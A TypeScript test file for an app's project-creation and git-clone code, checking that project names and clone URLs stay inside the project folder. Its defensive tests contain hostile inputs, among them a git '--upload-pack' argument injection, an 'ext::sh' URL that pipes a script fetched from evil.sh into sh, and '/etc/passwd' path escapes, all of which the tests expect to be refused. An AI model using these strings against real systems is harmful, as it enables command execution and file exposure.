/**
 * Add project — the pure halves.
 *
 * The containment model is the whole reason `createProject` and `cloneProject`
 * can be reachable from a phone while `addProjectFolder` cannot: a remote
 * supplies a NAME or a URL, and the host decides where that goes. Most of what
 * is pinned here is that boundary holding under inputs nobody would type by
 * hand.
 */
import { describe, expect, it, vi } from "vitest";
import * as path from "node:path";
import {
  PROJECT_NAME_MAX,
  classifyCloneFailure,
  cloneDestination,
  cloneFailureText,
  cloneUrlError,
  displayPath,
  GITHUB_CLI_DOWNLOAD,
  githubCliInstallCommand,
  githubFixFor,
  githubSignInCommand,
  offersGithubSetup,
  projectDestination,
  projectNameError,
  projectRoot,
  repoNameFromCloneUrl,
  withinRoot,
} from "../src/project-create";
import { CLONE_TIMEOUT_MS, commandOnPath, runGitClone } from "../src/git-clone";

// Drive-qualified on Windows: projectDestination resolves, and an unrooted
// POSIX-shaped path would pick up the test runner's drive letter and make the
// containment assertions compare two different things.
const HOME = process.platform === "win32"
  ? path.join("C:\\", "Users", "pawel")
  : path.join(path.sep + "home", "pawel");
const ROOT = path.join(HOME, "Grok Build");

describe("where projects go", () => {
  it("uses the folder the first-run default already chose", () => {
    // Not a new location: provisionDefaultProjectDir picked ~/Grok Build, and
    // for reasons (macOS TCC, findable in Finder) that have not changed.
    expect(projectRoot(HOME)).toBe(ROOT);
  });

  it("shows a home-relative path rather than the user's home directory", () => {
    const home = HOME;
    expect(displayPath(path.join(home, "Grok Build"), home)).toBe("~/Grok Build");
    expect(displayPath(path.join(home, "Grok Build", "Q3"), home)).toBe("~/Grok Build/Q3");
    // Outside home: shown as-is rather than mangled into a wrong `~` path.
    expect(displayPath(path.join(path.sep + "srv", "work"), home)).toBe(path.join(path.sep + "srv", "work"));
  });
});

describe("project names", () => {
  it("accepts the names people actually type", () => {
    for (const name of ["Q3 Positioning", "grok-build-vscode", "notes_2026", "Ünïcødé"]) {
      expect(projectNameError(name), name).toBeNull();
    }
  });

  it("refuses anything that is not a name", () => {
    expect(projectNameError("")).toMatch(/Enter a name/);
    expect(projectNameError("   ")).toMatch(/Enter a name/);
    expect(projectNameError(undefined)).toMatch(/Enter a name/);
    expect(projectNameError(42)).toMatch(/Enter a name/);
    expect(projectNameError("x".repeat(PROJECT_NAME_MAX + 1))).toMatch(/limited to/);
  });

  it("refuses separators, so a name can never become a path", () => {
    for (const name of ["a/b", "a\\b", "..", "../escape", "C:evil", "a?b", 'a"b', "a|b", "a<b"]) {
      expect(projectNameError(name), name).not.toBeNull();
    }
  });

  it("refuses the Windows traps that fail as something other than a naming error", () => {
    // Silently stripped, so `Report.` becomes `Report` and the folder the user
    // is looking at is not the one they named.
    expect(projectNameError("Report.")).toMatch(/space or a dot/);
    expect(projectNameError("Report ")).toBeNull(); // trimmed first, so fine
    expect(projectNameError("Report .")).toMatch(/space or a dot/);
    // Device names, with or without an extension, any case.
    for (const name of ["CON", "con", "nul", "LPT1", "com9.txt", "AUX"]) {
      expect(projectNameError(name), name).toMatch(/reserved/);
    }
    expect(projectNameError("console")).toBeNull();
  });

  it("refuses a hidden folder rather than making one by accident", () => {
    expect(projectNameError(".secret")).toMatch(/hide the folder/);
    expect(projectNameError("...")).toMatch(/not dots/);
  });
});

describe("containment", () => {
  it("puts a valid name directly under the root", () => {
    expect(projectDestination(ROOT, "Q3 Positioning")).toBe(path.join(ROOT, "Q3 Positioning"));
    expect(projectDestination(ROOT, "  spaced  ")).toBe(path.join(ROOT, "spaced"));
  });

  it("answers null rather than a path outside the root", () => {
    for (const name of ["..", "../../etc", "/etc/passwd", "a/b", "C:\\Windows"]) {
      expect(projectDestination(ROOT, name), name).toBeNull();
    }
  });

  it("accepts only a DIRECT child, checked on the resolved path", () => {
    expect(withinRoot(ROOT, path.join(ROOT, "child"))).toBe(true);
    expect(withinRoot(ROOT, path.join(ROOT, "child", "grandchild"))).toBe(false);
    expect(withinRoot(ROOT, ROOT)).toBe(false);
    expect(withinRoot(ROOT, path.join(ROOT, ".."))).toBe(false);
    expect(withinRoot(ROOT, path.join(ROOT, "..", "elsewhere"))).toBe(false);
  });
});

describe("clone URLs", () => {
  it("accepts https, ssh and scp-style remotes", () => {
    for (const url of [
      "https://github.com/phuryn/grok-remote",
      "https://github.com/phuryn/grok-remote.git",
      "http://gitlab.internal/team/app.git",
      "ssh://git@github.com/phuryn/grok-remote.git",
      "git@github.com:phuryn/grok-remote.git",
    ]) {
      expect(cloneUrlError(url), url).toBeNull();
    }
  });

  it("refuses a leading dash, which git reads as an OPTION and not an address", () => {
    // The argument-injection case: `--upload-pack=<command>` is arbitrary
    // execution even though the args are passed as an array and never reach a
    // shell. Refused rather than sanitised.
    expect(cloneUrlError("--upload-pack=touch /tmp/pwned")).not.toBeNull();
    expect(cloneUrlError("-u")).not.toBeNull();
  });

  it("refuses git's reachable-but-dangerous transports", () => {
    // `ext::sh -c ...` runs a command. Not on the allowlist, so it never gets
    // as far as the dash check.
    expect(cloneUrlError("ext::sh -c 'curl evil.sh | sh'")).not.toBeNull();
    expect(cloneUrlError("file:///etc")).not.toBeNull();
    expect(cloneUrlError("/etc/passwd")).not.toBeNull();
    expect(cloneUrlError("")).toMatch(/Paste a repository URL/);
    expect(cloneUrlError(undefined)).toMatch(/Paste a repository URL/);
    expect(cloneUrlError("https://github.com/x y")).not.toBeNull();
    expect(cloneUrlError("https://" + "x".repeat(600))).toMatch(/too long/);
  });

  it("names the folder git itself would create", () => {
    expect(repoNameFromCloneUrl("https://github.com/phuryn/grok-remote")).toBe("grok-remote");
    expect(repoNameFromCloneUrl("https://github.com/phuryn/grok-remote.git")).toBe("grok-remote");
    expect(repoNameFromCloneUrl("https://github.com/phuryn/grok-remote/")).toBe("grok-remote");
    expect(repoNameFromCloneUrl("git@github.com:phuryn/grok-remote.git")).toBe("grok-remote");
    expect(repoNameFromCloneUrl("https://github.com/phuryn/repo?tab=readme")).toBe("repo");
  });

  it("answers nothing when a URL names no repository", () => {
    expect(repoNameFromCloneUrl("https://github.com/")).toBeNull();
    expect(repoNameFromCloneUrl("https://github.com")).toBeNull();
    expect(repoNameFromCloneUrl("")).toBeNull();
    // A repo whose name would be a hidden folder is refused by the same rule
    // that refuses a typed one.
    expect(repoNameFromCloneUrl("https://github.com/o/.hidden")).toBeNull();
  });

  it("lands a clone under the root, never anywhere a URL suggested", () => {
    expect(cloneDestination(ROOT, "https://github.com/phuryn/grok-remote")).toBe(
      path.join(ROOT, "grok-remote"),
    );
    expect(cloneDestination(ROOT, "https://github.com/")).toBeNull();
  });
});

describe("failed clones", () => {
  it("recognises the failures that change what we offer next", () => {
    expect(classifyCloneFailure("fatal: could not read Username for 'https://github.com': terminal prompts disabled")).toBe("auth");
    expect(classifyCloneFailure("remote: Permission denied (publickey).")).toBe("auth");
    expect(classifyCloneFailure("remote: Repository not found.")).toBe("not-found");
    expect(classifyCloneFailure("fatal: destination path 'x' already exists and is not an empty directory.")).toBe("exists");
    expect(classifyCloneFailure("spawn git ENOENT")).toBe("no-git");
    expect(classifyCloneFailure("fatal: unable to access: Could not resolve host: github.com")).toBe("other");
  });

  it("puts the network case in `other` even when the text also says 404", () => {
    // Order matters: a transport failure is not a permissions problem, and
    // offering a sign-in for one would send the user down the wrong path.
    expect(classifyCloneFailure("Could not resolve host: github.com (404)")).toBe("other");
  });

  it("says what a recognised failure means, and passes the rest through", () => {
    expect(cloneFailureText("auth", "")).toMatch(/sign in first/);
    expect(cloneFailureText("no-git", "")).toMatch(/Git isn't installed/);
    expect(cloneFailureText("not-found", "")).toMatch(/wasn't found/);
    // Unrecognised: git's own last line, minus the `fatal:` noise.
    expect(cloneFailureText("other", "warning: x\nfatal: unable to access 'https://h/': timed out")).toBe(
      "unable to access 'https://h/': timed out",
    );
    expect(cloneFailureText("other", "")).toBe("The clone failed.");
  });

  it("offers GitHub sign-in only for github.com, and only where it would help", () => {
    const gh = "https://github.com/o/r";
    expect(offersGithubSetup(gh, "auth")).toBe(true);
    expect(offersGithubSetup(gh, "not-found")).toBe(true);
    expect(offersGithubSetup(gh, "other")).toBe(false);
    expect(offersGithubSetup(gh, "no-git")).toBe(false);
    expect(offersGithubSetup("git@github.com:o/r.git", "auth")).toBe(true);
    // `gh auth login` cannot help a GitLab failure, so it is not offered.
    expect(offersGithubSetup("https://gitlab.com/o/r", "auth")).toBe(false);
    expect(offersGithubSetup("https://notgithub.com.evil.example/o/r", "auth")).toBe(false);
  });

  it("signs in AND wires gh into git, because login alone may not", () => {
    // `gh auth login` stores a token for gh and then ASKS whether to configure
    // git. On a machine where git already authenticates through Git Credential
    // Manager — which is the Windows default — answering no leaves the clone
    // failing exactly as before while the user has every reason to believe they
    // just signed in. Proved on the owner's box: `gh auth logout` changed
    // nothing, because gh was never in git's path at all.
    for (const p of ["darwin", "linux"] as NodeJS.Platform[]) {
      expect(githubSignInCommand(p)).toBe("gh auth login && gh auth setup-git");
    }
    // Windows PowerShell 5.1 has no `&&`, and PowerShell is the shell both
    // hosts open there.
    expect(githubSignInCommand("win32")).toBe("gh auth login; if ($?) { gh auth setup-git }");
    expect(githubSignInCommand("win32")).not.toContain("&&");
  });

  it("offers what the machine can actually do, in three flavours", () => {
    const has = (...present: string[]) => (c: string) => present.includes(c);

    // gh is there: signing in is the whole fix.
    expect(githubFixFor("win32", has("gh", "winget"))).toEqual({ kind: "auth" });
    expect(githubFixFor("darwin", has("gh"))).toEqual({ kind: "auth" });

    // No gh, but a package manager we can drive.
    expect(githubFixFor("win32", has("winget")))
      .toEqual({ kind: "install", command: "winget install --id GitHub.cli -e" });
    expect(githubFixFor("darwin", has("brew")))
      .toEqual({ kind: "install", command: "brew install gh" });

    // Neither. "Install it with brew" is useless advice to the many Mac users
    // who have never installed Homebrew, and winget is absent on older Windows
    // for the same reason — so the honest answer is where to download it.
    expect(githubFixFor("darwin", has())).toEqual({ kind: "download", where: GITHUB_CLI_DOWNLOAD });
    expect(githubFixFor("win32", has())).toEqual({ kind: "download", where: GITHUB_CLI_DOWNLOAD });
    expect(githubFixFor("linux", has())).toEqual({ kind: "download", where: GITHUB_CLI_DOWNLOAD });
    // A platform with no known package manager at all.
    expect(githubFixFor("aix" as NodeJS.Platform, has("gh"))).toEqual({ kind: "auth" });
    expect(githubFixFor("aix" as NodeJS.Platform, has()))
      .toEqual({ kind: "download", where: GITHUB_CLI_DOWNLOAD });
  });

  it("knows how to install the CLI where it can", () => {
    expect(githubCliInstallCommand("win32")?.file).toBe("winget");
    expect(githubCliInstallCommand("darwin")?.display).toBe("brew install gh");
    expect(githubCliInstallCommand("linux")?.args).toEqual(["apt", "install", "gh"]);
    expect(githubCliInstallCommand("aix" as NodeJS.Platform)).toBeNull();
  });
});

describe("the process seam", () => {
  it("clones with prompts disabled, and never rejects", async () => {
    const execFile = vi.fn((_file, _args, _opts, cb: (e: unknown, o: string, s: string) => void) => {
      cb(null, "", "");
      return {} as never;
    });
    const io = { execFile, execFileSync: vi.fn() } as never;
    await expect(runGitClone("https://github.com/o/r", "/dest", io, {})).resolves.toBe("");
    const [file, args, opts] = execFile.mock.calls[0];
    expect(file).toBe("git");
    // `--` so a URL that survived validation still cannot be read as a flag.
    expect(args).toEqual(["clone", "--", "https://github.com/o/r", "/dest"]);
    // Without these two the form hangs on a credential prompt instead of
    // reporting an auth failure it could offer to fix.
    expect((opts as { env: Record<string, string> }).env.GIT_TERMINAL_PROMPT).toBe("0");
    expect((opts as { env: Record<string, string> }).env.GCM_INTERACTIVE).toBe("never");
    expect((opts as { timeout: number }).timeout).toBe(CLONE_TIMEOUT_MS);
  });

  it("returns git's combined output on failure rather than throwing", async () => {
    const execFile = vi.fn((_f, _a, _o, cb: (e: unknown, o: string, s: string) => void) => {
      cb(Object.assign(new Error("Command failed"), { code: 128 }), "out", "fatal: nope");
      return {} as never;
    });
    const io = { execFile, execFileSync: vi.fn() } as never;
    const failure = await runGitClone("https://github.com/o/r", "/dest", io, {});
    expect(failure).toContain("fatal: nope");
    expect(failure).toContain("out");
    expect(failure).toContain("Command failed");
  });

  it("reads a non-zero exit from where/which as 'not installed'", () => {
    const found = { execFile: vi.fn(), execFileSync: vi.fn() } as never;
    expect(commandOnPath("gh", "linux", found)).toBe(true);
    expect((found as { execFileSync: { mock: { calls: unknown[][] } } }).execFileSync.mock.calls[0][0]).toBe("which");

    const missing = {
      execFile: vi.fn(),
      execFileSync: vi.fn(() => { throw new Error("not found"); }),
    } as never;
    expect(commandOnPath("gh", "win32", missing)).toBe(false);
    expect((missing as { execFileSync: { mock: { calls: unknown[][] } } }).execFileSync.mock.calls[0][0]).toBe("where");
  });
});
